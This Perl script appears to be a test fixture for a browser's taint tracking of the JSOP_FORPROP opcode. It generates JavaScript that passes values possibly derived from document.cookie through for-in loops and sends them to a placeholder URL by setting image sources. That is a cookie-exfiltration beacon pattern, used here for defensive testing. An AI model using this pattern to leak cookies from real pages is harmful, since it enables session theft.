#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_FORPROP";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = evil;
		var dut = { x : 7 };
		var dut2 = { x : 7 };
		var dut3 = { x : 7 };

		// shouldn't be evil 
		var ob = { 'y' : 9};
		for (ob.y in dut) {
			notevil = dut[ob.y];
		}
		
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 
		if ($evil) {
			var ob2 = { 'y' : 9};
			for (ob2.y in dut2) {
				notevil2 = dut2[ob2.y];
			}
		}
	
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage 	
		var ob3 = { 'y' : 9};
		dut3.x = evil;
		for (ob3.y in dut3) {
			notevil3 = dut3[ob3.y];
		}
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
